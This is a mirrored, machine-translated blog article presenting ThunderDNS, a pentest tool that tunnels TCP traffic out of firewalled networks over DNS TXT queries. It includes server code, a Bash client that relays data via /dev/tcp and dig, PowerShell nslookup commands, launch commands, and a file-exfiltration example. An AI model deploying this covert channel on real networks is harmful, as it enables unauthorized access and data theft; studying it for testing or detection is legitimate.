<!doctype html>
<html class="no-js" lang="en">

<head>
  <!-- Global site tag (gtag.js) - Google Analytics -->
  <script async src="https://www.googletagmanager.com/gtag/js?id=UA-134931760-1"></script>
  <script>
    window.dataLayer = window.dataLayer || [];
    function gtag(){dataLayer.push(arguments);}
    gtag('js', new Date());

    gtag('config', 'UA-134931760-1');
  </script>

  <meta charset="utf-8">
  <meta http-equiv="x-ua-compatible" content="ie=edge">
  <title>Traffic at the end of the tunnel or DNS in pentest</title>
  <link rel="icon" type="image/x-icon" href="/favicon.ico" />
  <meta name="description" content="Hello! During penetration testing projects, we often encounter rigidly segmented networks that are almost completely isolated from the outside world. ...">
  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">

  <link rel="stylesheet" href="../../css/main.css">

  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
  <script>window.jQuery || document.write('<script src="../../js/vendors/jquery-3.3.1.min.js"><\/script>')</script>

  <script async src="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
  <script>
       (adsbygoogle = window.adsbygoogle || []).push({
            google_ad_client: "ca-pub-6974184241884155",
            enable_page_level_ads: true
       });
  </script>
</head>

<body>
  <!--[if lte IE 9]>
    <p class="browserupgrade">You are using an <strong>outdated</strong> browser. Please <a href="https://browsehappy.com/">upgrade your browser</a> to improve your experience and security.</p>
  <![endif]-->
  <header class="page-header js-page-header">
    <a class="page-header-logo-container" href="https://weekly-geekly.github.io/index.html"></a>
    <div class="page-header-text">Geekly Articles each Day</div>
  </header>
  <nav class="page-headings-container js-page-headings-container"></nav>
  <div class="tools-bar js-tools-bar">
    <!-- <a href="../../search.html" title="Search">üîé</a> -->
    <a class="js-list-of-headings-button" data-state="closed" href="#" title="Headings">üìú</a>
    <a class="js-go-to-top-button" href="#" title="Go to Top">‚¨ÜÔ∏è</a>
    <a class="js-go-to-bottom-button" href="#" title="Go to Bottom">‚¨áÔ∏è</a>
  </div>
  <a href="http://bit.ly/donateToWeeklyGeekly" class="donate-btn">DONATE</a>
  <section class="page js-page"><h1>Traffic at the end of the tunnel or DNS in pentest</h1><div class="post__text post__text-html js-mediator-article"><p><img src="https://habrastorage.org/webt/wj/uf/dd/wjufddhw28xxdtak6yot4xypigk.jpeg"></p><br><p>  Hello!  During penetration testing projects, we often encounter rigidly segmented networks that are almost completely isolated from the outside world.  Sometimes, to solve this problem, it is required to forward traffic through the only available protocol - DNS.  In this article, we will describe how to solve a similar problem in 2018 and which pitfalls are encountered in the process.  Also, popular utilities will be considered and the release of its own open-source utilities with features commonly found in existing similar tools will be presented. </p><a name="habracut"></a><br><h1 id="chto-takoe-dns-tunneli">  What are DNS tunnels? </h1><br><p>  On Habr√© there are already <a href="https://habr.com/post/65322/">several</a> <a href="https://habr.com/post/129097/">articles</a> explaining what DNS tunneling is.  However, a bit of theory about DNS tunneling can be found under the spoiler. </p><br><div class="spoiler">  <b class="spoiler_title">What is DNS tunneling?</b> <div class="spoiler_text"><p>  It happens that the access to the network is tightly cut off by the firewall, and you need to transfer data badly, and then the DNS tunneling technique comes to the rescue. </p><br><p>  On the diagram, everything looks like this: <br><img src="https://habrastorage.org/webt/bt/ax/w7/btaxw7-gmlbce6669ef_a3dmhzy.png"></p><br><p>  Queries to the DNS, even with the most stringent firewall settings, sometimes still pass, and this can be used by responding to them from your server on the other side.  Communication will be extremely slow, but this is enough to penetrate the organization's local network or, for example, for urgent access to the Internet via paid Wi-Fi abroad. </p></div></div><br><h1 id="chto-populyarno-na-dannyy-moment">  What is popular at the moment </h1><br><p>  Now on the Internet you can find many utilities for the operation of this technique - each with its own features and bugs.  We have chosen for comparison testing the five most popular: </p><br><ul><li>  dnscat2 </li><li>  iodine </li><li>  dns2tcp </li><li>  Heyoka </li><li>  OzymanDNS </li></ul><br><p>  More information about how we tested them can be found in our article on <a href="https://xakep.ru/2018/09/07/dns-tunneling/">Hacker</a> .  Here we give only the results. </p><br><p><img src="https://habrastorage.org/webt/jp/8m/ip/jp8mipmbbxog9uwevtoln1h2bh0.png"></p><br><p>  As can be seen from the results, it is possible to work, but in terms of penetration testing there are drawbacks: </p><br><ul><li>  compiled clients - it is much easier to run something interpretable on a machine with antivirus than a binary file; </li><li>  unstable work under Windows; </li><li>  the need to install additional software in some cases. </li></ul><br><p>  Because of these shortcomings, we needed to develop our own tool, and this is how it happened ... </p><br><h1 id="sozdaem-svoyu-utilitu-dlya-dns-tunnelirovaniya">  Create your own utility for DNS tunneling </h1><br><h2 id="predystoriya">  Prehistory </h2><br><p>  It all started during the internal pentest of one bank.  In the hall there was a public computer used for printing documents, references and other papers.  Our goal: to get the most benefit from the machine that was running Windows 7, had ‚ÄúKaspersky Anti-Virus‚Äù on board and allowed to access only certain pages (but at the same time it was possible to resolve DNS names). </p><br><p>  After conducting a primary analysis and receiving additional data from the car, we developed several attack vectors.  The ways of using the machine with the help of binary programs were immediately removed to the side, since ‚Äúgreat and terrible‚Äù ‚ÄúKaspersky‚Äù immediately rubbed it upon detecting the executable file.  However, we were able to get the ability to run scripts on behalf of the local administrator, after which one of the ideas was the ability to create a DNS tunnel. </p><br><p>  Searching for possible methods, we found a client on PowerShell for dnscat2 (we wrote about it earlier).  But in the end, the maximum that we managed to make was to establish a connection for a short time, after which the client fell. </p><br><p>  This, to put it mildly, upset us greatly, since in this situation the presence of an interpreted client was simply necessary.  Actually, this was one of the reasons for developing your own tool for DNS tunneling. </p><br><h2 id="trebovaniya">  Requirements </h2><br><p>  The main requirements for ourselves are: </p><br><ul><li>  the availability of universal (as far as possible) and interpretable clients for Unix and Windows systems.  For customers, the languages ‚Äã‚Äãbash and Powershell were chosen, respectively.  In the future, a Perl client for unix is ‚Äã‚Äãplanned; </li><li>  possibility of traffic forwarding from a specific application; </li><li>  Multiple client support per user. </li></ul><br><h2 id="arhitektura-proekta">  Project architecture </h2><br><p>  Based on the requirements, we started to develop.  In our view, the utility consists of 3 parts: the client on the internal machine, the DNS server, and a small proxy between the pentester application and the DNS server. </p><br><p><img src="https://habrastorage.org/webt/mt/zo/oz/mtzoozi8lmpyme22arlwee_ty2o.png"></p><br><p>  To begin with, we decided to forward the tunnel through TXT records. </p><br><p>  The principle of operation is quite simple: </p><br><ul><li>  Pentester starts the DNS server. </li><li>  The Pentester (or the user, through social engineering) launches the client on the internal machine.  On the client there are such parameters as the client's name and domain, as well as the ability to directly specify the IP address of the DNS server. </li><li> The Pentester (from the external network) starts the proxy, where it indicates the IP address of the DNS server, as well as the port where to knock, the IP targets (for example, ssh on the internal network where the client is sitting) and, accordingly, the target port.  You also need a client ID, which can be obtained by adding the <code>--clients</code> key. </li><li>  Pentester launches the application of interest, pointing the proxy port to localhost. </li></ul><br><h2 id="protokol-obscheniya">  Communication protocol </h2><br><p>  Consider a fairly simple protocol for communicating a server with a client. </p><br><h3 id="registraciya">  check in </h3><br><p>  When the client starts, it is registered on the server, requesting a TXT record through a subdomain of the following format: </p><br><p> <code>0&lt;7 random chars&gt;&lt;client name&gt;.&lt;your domain&gt;</code> </p> <br><p>  0 - registration key <br>  <code>&lt;7 random chars&gt;</code> - to avoid caching DNS records <br>  <code>&lt;client name&gt;</code> is the name given to the client at startup. <br>  <code>&lt;your domain&gt;</code> - ex .: xakep.ru <br>  In case of successful registration, the client in the TXT response receives a success message, as well as an id assigned to it, which he will continue to use. </p><br><h3 id="osnovnoy-cikl">  Main loop </h3><br><p>  After registration, the client begins to poll the server for the availability of new data in the format </p><br><p> <code>1&lt;7 random chars&gt;&lt;id&gt;.&lt;your domain&gt;</code> </p> <br><p>  In the case of the availability of new data in the TXT response, it receives them in the format </p><br><p>  <code>&lt;id&gt;&lt;target ip&gt;:&lt;target port&gt;:&lt;data in base64&gt;</code> , otherwise, comes <code>&lt;id&gt;ND</code> . </p><br><h3 id="cikl-zagruzki-dannyh">  Data loading cycle </h3><br><p>  The client in the loop checks if the data came from our <code>&lt;target&gt;</code> .  In case there is an answer, we read, from what has come, a buffer of size N Kb, divide it into blocks of length <code>250-&lt;len_of_your_domain&gt;-&lt;  &gt;</code> and send the data block by block in the format: <br> <code>2&lt;4randomchars&gt;&lt;id&gt;&lt;block_id&gt;.&lt;data&gt;.&lt;your_domain&gt;</code> </p> <br><p>  If the block is successful, we get OK with some data about the block transferred, and if the buffer transfer is complete, we get <code>ENDBLOCK</code> . </p><br><h2 id="dns-server">  DNS server </h2><br><p>  The DNS server for tunneling was written in Python3 using the dnslib library, which allows you to easily create your own DNS resolver by inheriting from the dnslib.ProxyResolver object and overriding the resolve method). </p><br><p>  Gorgeous dnslib allows you to create your ProxyDNS very quickly: </p><br><div class="spoiler">  <b class="spoiler_title">Little server code</b> <div class="spoiler_text"><pre> <code class="python hljs"><span class="hljs-class"><span class="hljs-keyword"><span class="hljs-class"><span class="hljs-keyword">class</span></span></span><span class="hljs-class"> </span><span class="hljs-title"><span class="hljs-class"><span class="hljs-title">Resolver</span></span></span><span class="hljs-params"><span class="hljs-class"><span class="hljs-params">(ProxyResolver)</span></span></span><span class="hljs-class">:</span></span> <span class="hljs-function"><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">def</span></span></span><span class="hljs-function"> </span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">__init__</span></span></span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">(self, upstream)</span></span></span><span class="hljs-function">:</span></span> super().__init__(upstream, <span class="hljs-number"><span class="hljs-number">53</span></span>, <span class="hljs-number"><span class="hljs-number">5</span></span>) <span class="hljs-function"><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">def</span></span></span><span class="hljs-function"> </span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">resolve</span></span></span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">(self, request, handler)</span></span></span><span class="hljs-function">:</span></span> <span class="hljs-comment"><span class="hljs-comment">#   domain_request = DOMAIN_REGEX.findall(str(request.q.qname)) type_name = QTYPE[request.q.qtype] if not domain_request: #  DNS ,     ,    : ,  google return super().resolve(request, handler) #  ,    result reply = request.reply() reply.add_answer(RR( rname=DNSLabel(str(request.q.qname)), rtype=QTYPE.TXT, rdata=dns.TXT(wrap(result, 255)), #      255 ,   ,   ttl=300 )) if reply.rr: return reply if __name__ == '__main__': port = int(os.getenv('PORT', 53)) upstream = os.getenv('UPSTREAM', '8.8.8.8') #       resolver = Resolver(upstream) udp_server = DNSServer(resolver, port=port) tcp_server = DNSServer(resolver, port=port, tcp=True) udp_server.start_thread() tcp_server.start_thread() try: while udp_server.isAlive(): sleep(1) except KeyboardInterrupt: pass</span></span></code> </pre> </div></div><br><p>  In resolve (), we define reactions to DNS requests from the client: registration, request for new records, reverse data transfer and deletion of the user. </p><br><p>  User information is stored in the SQLite database, the clipboard is in RAM and has the following structure, in which the key is the client number: </p><br><pre> <code class="json hljs">{ { <span class="hljs-attr"><span class="hljs-attr">"target_ip"</span></span>: <span class="hljs-string"><span class="hljs-string">"192.168.1.2"</span></span>, # IP ‚Äú‚Äù -    <span class="hljs-attr"><span class="hljs-attr">"target_port"</span></span>: <span class="hljs-string"><span class="hljs-string">""</span></span>, #  ‚Äú‚Äù <span class="hljs-attr"><span class="hljs-attr">"socket"</span></span>: None, #       <span class="hljs-attr"><span class="hljs-attr">"buffer"</span></span>: None, #      <span class="hljs-attr"><span class="hljs-attr">"upstream_buffer"</span></span>: b'' #      }, ... }</code> </pre> <br><p>  To put the data from the pentester into the buffer, we wrote a small ‚Äúreceiver‚Äù, which is running in a separate stream.  It catches connections from the pentester and performs routing: which client to send requests. </p><br><p>  Before starting the server, the user needs to set only one parameter: DOMAIN_NAME - the name of the domain with which the server will work. </p><br><h2 id="klient-na-bash">  Bash client </h2><br><p>  Bash was chosen for writing client for Unix systems, as it is most often found in modern Unix systems.  Bash provides the ability to establish a connection via / dev / tcp /, even with unprivileged user rights. </p><br><p>  We will not analyze each piece of code in detail, we will look only at the most interesting moments. <br>  The principle of the client is simple.  To communicate with the DNS, the standard <code>dig</code> utility is used.  The client is registered on the server, and then, in an eternal cycle, it starts to perform requests using the protocol described earlier.  Under the spoiler more. </p><br><div class="spoiler">  <b class="spoiler_title">More about Bash client</b> <div class="spoiler_text"><p>  It checks whether the connection has been established, and if so, the reply function is executed (reading incoming data from the target, splitting and sending to the server). </p><br><p>  After that, it is specified whether there is new data from the server.  If they are detected, then we check whether the connection needs to be dropped.  The break itself occurs when we receive information about the target with ip 0.0.0.0 and port 00. In this case, we clear the file descriptor (if it is not open, there will be no problems) and change the target ip to the incoming 0.0.0.0. </p><br><p>  Next on the code we see if there is a need to establish a new connection.  As soon as the following messages start sending us data for the target, we, in case the previous ip does not match the current one (after a reset, it will be so), change the target to a new one, and establish a connection using the <code>exec 3&lt;&gt;/dev/tcp/$ip/$port</code> command <code>exec 3&lt;&gt;/dev/tcp/$ip/$port</code> , where <code>$ip</code> - target, <code>$port</code> - target port. <br>  As a result, if the connection is already established, then the incoming piece of data is decoded and flies to the descriptor via the command <code>echo -e -n ${data_array[2]} | base64 -d &gt;&amp;3</code>  <code>echo -e -n ${data_array[2]} | base64 -d &gt;&amp;3</code> , where <code>${data_array[2]}</code> is what we got from the server. </p><br><pre> <code class="plaintext hljs">while : do if [[ $is_set = 'SET' ]] then reply fi data=$(get_data $id) if [[ ${data:0:2} = $id ]] then if [[ ${data:2:2} = 'ND' ]] then sleep 0.1 else IFS=':' read -r -a data_array &lt;&lt;&lt; $data data=${data_array[0]} is_id=${data:0:2} ip=${data:2} port=${data_array[1]} if [[ $is_id = $id ]] then if [[ $ip = '0.0.0.0' &amp;&amp; $port = '00' ]] then exec 3&lt;&amp;- exec 3&gt;&amp;- is_set='NOTSET' echo "Connection OFF" last_ip=$ip fi if [[ $last_ip != $ip ]] then exec 3&lt;&gt;/dev/tcp/$ip/$port is_set='SET' echo "Connection ON" last_ip=$ip fi if [[ $is_set = 'SET' ]] then echo -e -n ${data_array[2]} | base64 -d &gt;&amp;3 fi fi fi fi done</code> </pre> <br><p>  Now consider sending in the reply function.  First, we read 2048 bytes from the descriptor and immediately encode them in <code>$(timeout 0.1 dd bs=2048 count=1 &lt;&amp;3 2&gt; /dev/null | base64 -w0</code> ).  Further, if the answer is empty, we exit the function, otherwise we start the operation on splitting and sending.  Note that after forming a request to send via dig, the delivery is checked for success.  If successful, we exit the cycle, otherwise we try until we succeed. </p><br><pre> <code class="plaintext hljs">reply() { response=$(timeout 0.1 dd bs=2048 count=1 &lt;&amp;3 2&gt; /dev/null | base64 -w0) if [[ $response != '' ]] then debug_echo 'Got response from target server ' response_len=${#response} number_of_blocks=$(( ${response_len} / ${MESSAGE_LEN})) if [[ $(($response_len % $MESSAGE_LEN)) = 0 ]] then number_of_blocks-=1 fi debug_echo 'Sending message back...' point=0 for ((i=$number_of_blocks;i&gt;=0;i--)) do blocks_data=${response:$point:$MESSAGE_LEN} if [[ ${#blocks_data} -gt 63 ]] then localpoint=0 while : do block=${blocks_data:localpoint:63} if [[ $block != '' ]] then dat+=$block. localpoint=$((localpoint + 63)) else break fi done blocks_data=$dat dat='' point=$((point + MESSAGE_LEN)) else blocks_data+=. fi while : do block=$(printf %03d $i) check_deliver=$(dig ${HOST} 2$(generate_random 4)$id$block.$blocks_data${DNS_DOMAIN} TXT | grep -oP '\"\K[^\"]+') if [[ $check_deliver = 'ENDBLOCK' ]] then debug_echo 'Message delivered!' break fi IFS=':' read -r -a check_deliver_array &lt;&lt;&lt; $check_deliver deliver_data=${check_deliver_array[0]} block_check=${deliver_data:2} if [[ ${check_deliver_array[1]} = 'OK' ]] &amp;&amp; [[ $((10#${deliver_data:2})) = $i ]] &amp;&amp; [[ ${deliver_data:0:2} = $id ]] then break fi done done else debug_echo 'Empty message from target server, forward the next package ' fi }</code> </pre> </div></div><br><h2 id="powershell-klient">  Powershell client: </h2><br><p>  Since we needed complete interpretability and work on most of the current systems, the client-side client for Windows is the standard nslookup utility for communicating via DNS and the System.Net.Sockets.TcpClient object for establishing a connection on the internal network. </p><br><p>  Everything is also very simple.  Each loop iteration is a call to the nslookup command using the protocol described earlier. </p><br><p>  For example, to register, execute the command: <br> <code>$text = &amp;nslookup -q=TXT $act$seed$clientname$Dot$domain $server 2&gt;$null</code> <br>  If errors occur, we do not show them by sending the error descriptor values ‚Äã‚Äãto $ null. </p><br><p>  nslookup returns us a similar answer: <br><img src="https://habrastorage.org/webt/xz/n9/wk/xzn9wkh45ds0pxmpykpo5xrhldc.png"></p><br><p>  After that, we need to pull out all the lines in quotes, for which we pass through them with a regular schedule: </p><br><p> <code>$text = [regex]::Matches($text, '"(.*)"') | %{$_.groups[1].value} | %{$_ -replace '([ "\t]+)',$('') }</code> </p> <br><p>  Now you can process the received commands. <br>  Each time the IP address of the ‚Äúvictim‚Äù changes, a TCP client is created, a connection is established, and data transfer begins.  From the DNS server, the base64 information is decoded, and the bytes are sent to the victim.  If the ‚Äúvictim‚Äù answered something, then we encode, divide into parts and execute nslookup requests according to the protocol.  Everything. <br>  When you press Ctrl + C, you are prompted to delete the client. </p><br><h2 id="proxy">  Proxy: </h2><br><p>  Proxy for pentester is a small proxy server on python3. </p><br><p><img src="https://habrastorage.org/webt/k4/lp/0u/k4lp0uzffo9oo90eqommsetwvn4.png"></p><br><p>  In the parameters you need to specify the DNS server IP, the port to connect to on the server, the --clients option returns the list of registered clients, <code>--target - target ip</code> , <code>--target_port - target port</code> , <code>--client</code> - client id with which we will work (seen after execution of <code>--clients</code> ), <code>--send_timeout</code> - timeout for sending messages from the application. </p><br><p>  When launched with the <code>--clients</code> parameter, the proxy sends a request in the format <code>\x00GETCLIENTS\n</code> server. <br>  In the case when we start work, when connecting, send a message in the format <code>\x02RESET:client_id\n</code> to reset the previous connection.  After we send information about our target: <code>\x01client_id:ip:port:\n</code> <br>  Further, when sending messages to the client, we send bytes in the <code>\x03data</code> format, and we simply send raw bytes to the application. <br>  Also, the proxy supports SOCKS5 mode. </p><br><h2 id="kakie-trudnosti-mogut-vozniknut">  What difficulties may arise? </h2><br><p>  As with any mechanism, the utility may fail.  Let's not forget that a DNS tunnel is a subtle thing, and its work can be influenced by many factors, ranging from the network architecture, to the quality of the connection to your working server. </p><br><p>  In the course of testing, we occasionally noticed small failures.  For example, with a high print speed, working via ssh, you need to configure the <code>--send_timeout</code> parameter, because otherwise the client starts to hang.  Also, sometimes the connection may not be established the first time, but this is easily treated by restarting the proxy, since with the new connection the past connection will be reset.  There were also problems with resolving domains when working with proxychains, however this is also fixable if you specify an additional parameter for proxychains.  It is worth noting that at the moment the utility does not control the appearance of unnecessary requests from caching DNS servers, so sometimes the connection may fall, but this is again treated in the manner described above. </p><br><h2 id="zapusk">  Launch </h2><br><p>  We configure NS records on the domain: </p><br><p><img src="https://habrastorage.org/webt/_q/p4/er/_qp4erwn54g5nqqxmlnnquv1itk.png"></p><br><p>  We wait until the cache is updated (up to 5 hours usually). </p><br><p>  We start the server: <br> <code>python3 ./server.py --domain oversec.ru</code> </p> <br><p>  Start the client (Bash): <br> <code>bash ./bash_client.sh -d oversec.ru -n TEST1</code> </p> <br><p>  Start the client (Win): <br> <code>PS:&gt; ./ps_client.ps1 -domain oversec.ru -clientname TEST2</code> </p> <br><p>  Let's look at the list of connected clients: <br> <code>python3 ./proxy.py --dns 138.197.178.150 --dns_port 9091 --clients</code> </p> <br><p>  Run the proxy: <br> <code>python3 ./proxy.py --dns 138.197.178.150 --dns_port 9091 --socks5 --localport 9090 --client 1</code> </p> <br><p>  Testing: </p><br><p>  After the server and at least one client have been started, we can access the proxy as if it were our remote machine. <br>  Let's try to simulate the following situation: the pentester wants to download the file from the server from the local network of the organization protected by a firewall, while using social engineering methods he could force the DNS client to run inside the network and find out the SSH server password. </p><br><p>  The Pentester runs a proxy on his machine, indicating the necessary client, and then can make similar calls that go to the client, and from the client to the local network. <br> <code>scp -P9090 -C root@localhost:/root/dnserver.py test.kek</code> </p> <br><p>  Let's see what happened: </p><br><p><img src="https://habrastorage.org/webt/xd/un/ag/xdunagwddytfwinhgkcxxossnqi.png"></p><br><p>  At the top left you can see the DNS requests that come to the server, on the top right - proxy traffic, on the bottom left - traffic from the client, and on the bottom right - our application.  The speed was pretty decent for a DNS tunnel: 4.9Kb / s using compression. </p><br><p>  When launched without compression, the utility showed a speed of 1.8 kb / s: </p><br><p><img src="https://habrastorage.org/webt/vs/lv/6o/vslv6oycbyicpppojlsbh2hs_hi.png"></p><br><p>  Let's look carefully at the DNS server traffic, for this we use the tcpdump utility. <br> <code>tcpdump -i eth0 udp port 53</code> </p> <br><p><img src="https://habrastorage.org/webt/oo/wx/pf/oowxpflehofc-dmyizrf6pwre08.png"></p><br><p>  We see that everything corresponds to the described protocol: the client constantly polls the server whether it has any new data for this client using queries of the form <code>1c6Zx9Vi39.oversec.ru</code> .  If there is data, the server responds with a set of TXT records, otherwise% client_num% ND ( <code>39ND</code> ).  The client sends information to the server using the types of queries <code>28sTx39003.MyNTYtZ2NtQG9wZW5zc2guY29tAAAAbGNoYWNoYTIwLXBvbHkxMzA1QG9wZW5zc.2guY29tLGFlczEyOC1jdHIsYWVzMTkyLWN0cixhZXMyNTYtY3RyLGFlczEyOC1n.Y21Ab3BlbnNzaC5jb20sYWVzMjU2LWdjbUBvcGVuc3NoLmNvbQAAANV1bWFjLTY.0LWV0bUBvcGVuc3NoLmNvbSx1bWFjLTEyOC1.oversec.ru.</code> </p><br><p>  In the following videos you can visually see the work of the utility in conjunction with meterpreter and in SOCKS5 mode. </p><br><iframe width="560" height="315" src="https://www.youtube.com/embed/N6Nm9mWFI6w" frameborder="0" allow="accelerometer; autoplay; encrypted-media; gyroscope; picture-in-picture" allowfullscreen=""></iframe><br><iframe width="560" height="315" src="https://www.youtube.com/embed/xSM-Dl1uo1k" frameborder="0" allow="accelerometer; autoplay; encrypted-media; gyroscope; picture-in-picture" allowfullscreen=""></iframe><br><h2 id="itog">  Total: </h2><br><p>  Let's summarize a little.  What are the features of this development and why we recommend using it? </p><br><ol><li>  Interpreted clients on Bash and Powershell: no EXE files or ELFs that can be problematic to launch. </li><li>  Connection stability: in tests, our utility behaved much more stable, and if there were any bugs, you could simply reconnect, while the client did not fall, as in the case of dnscat2, for example. </li><li>  High enough speed for a DNS tunnel: of course, the speed does not reach iodine, but there is a much lower level compiled solution. </li><li>  Administrator rights are not required: the Bash client works without administrator rights, and Powershell scripts are sometimes prohibited by security policies, but this is quite easy to manage. </li><li>  There is a socks5 proxy mode that allows you to do so <code>curl -v --socks5 127.0.0.1:9011 https://ident.me</code> or run nmap on the entire internal network. </li></ol><br><p>  <a href="https://github.com/fbkcs/ThunderDNS">The utility code is located here.</a> </p></div>
      <br>
        <script async src="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
        <ins class="adsbygoogle"
          style="display:block; text-align:center;"
          data-ad-layout="in-article"
          data-ad-format="fluid"
          data-ad-client="ca-pub-6974184241884155"
          data-ad-slot="8945601208"></ins>
        <script>
          (adsbygoogle = window.adsbygoogle || []).push({});
        </script>
      <br>
    <p>Source: <a href="https://habr.com/ru/post/432078/">https://habr.com/ru/post/432078/</a></p>
<section class="more-articles-navigation-panel js-more-articles-navigation-panel">
<h4>More articles:</h4>
<nav class="list-of-articles-container js-list-of-articles-container"><ul class="list-of-pages js-list-of-pages">
<li><a href="../432068/index.html">How to facilitate learning English: 5 useful services</a></li>
<li><a href="../432070/index.html">Briefly about redux-saga channels</a></li>
<li><a href="../432072/index.html">Three types of memory leaks</a></li>
<li><a href="../432074/index.html">How players rip Spelunky's reality fabric with shotguns</a></li>
<li><a href="../432076/index.html">Uncalled function slows down the program 5 times</a></li>
<li><a href="../432080/index.html">Misconceptions players in assessing risks. Control random number generator in development</a></li>
<li><a href="../432082/index.html">Microsoft AI chatbot released a collection of clothes for China</a></li>
<li><a href="../432084/index.html">How we organized the competition of shifts between production workers (as in the USSR)</a></li>
<li><a href="../432086/index.html">3D printing in the international school named after M. V. Lomonosov</a></li>
<li><a href="../432088/index.html">MySQL High Availability on GitHub</a></li>
</ul></nav>
</section><br />
<a href="../../allArticles.html"><strong>All Articles</strong></a>
<script src="../../js/main.js"></script>

<!-- Yandex.Metrika counter -->
<script type="text/javascript" >
  (function (d, w, c) {
      (w[c] = w[c] || []).push(function() {
          try {
              w.yaCounter52496797 = new Ya.Metrika({
                  id:52496797,
                  clickmap:true,
                  trackLinks:true,
                  accurateTrackBounce:true,
                  webvisor:true
              });
          } catch(e) { }
      });

      var n = d.getElementsByTagName("script")[0],
          s = d.createElement("script"),
          f = function () { n.parentNode.insertBefore(s, n); };
      s.type = "text/javascript";
      s.async = true;
      s.src = "https://mc.yandex.ru/metrika/watch.js";

      if (w.opera == "[object Opera]") {
          d.addEventListener("DOMContentLoaded", f, false);
      } else { f(); }
  })(document, window, "yandex_metrika_callbacks");
</script>
<noscript><div><img src="https://mc.yandex.ru/watch/52496797" style="position:absolute; left:-9999px;" alt="" /></div></noscript>

<!-- Google Analytics -->
  <script>
    window.ga = function () { ga.q.push(arguments) }; ga.q = []; ga.l = +new Date;
    ga('create', 'UA-134931760-1', 'auto'); ga('send', 'pageview')
  </script>
  <script src="https://www.google-analytics.com/analytics.js" async defer></script>

</section>

  <footer class="page-footer">
    <div class="page-footer-legal-info-container page-footer-element">
      <p>
        Weekly-Geekly | <span class="page-footer-legal-info-year js-page-footer-legal-info-year">2019</span>
      </p>
    </div>
    <div class="page-footer-counters-container page-footer-element">
      <a class="page-footer-counter-clustrmap" href='#'  title='Visit tracker'><img src='https://clustrmaps.com/map_v2.png?cl=698e5a&w=271&t=t&d=6iCFw7uJz0zcOaoxz5k5PcLCJUzv2WG8G5V8M3U6Rc4&co=3a3a3a&ct=ffffff'/></a>
    </div>
  </footer>
</body>

</html>